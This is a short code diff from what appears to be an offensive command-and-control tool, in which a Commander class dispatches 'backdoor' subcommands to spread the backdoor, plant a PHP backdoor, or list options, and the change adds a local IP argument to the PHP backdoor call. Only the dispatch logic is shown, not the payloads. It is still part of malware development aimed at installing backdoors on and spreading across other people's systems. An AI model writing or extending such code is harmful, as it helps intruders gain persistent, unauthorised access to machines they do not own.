@@ -99,7 +99,7 @@ class Commander(object):
                             if command.split()[1] == "spread" or command.split()[1] == "self":
                                 backdoor.spread()
                             elif command.split()[1] == "php":
-                                backdoor.php(info.host_ip.split(',')[0])
+                                backdoor.php(info.host_ip.split(',')[0], info.local_ip)
                             else:
                                 backdoor.list()
                         else:
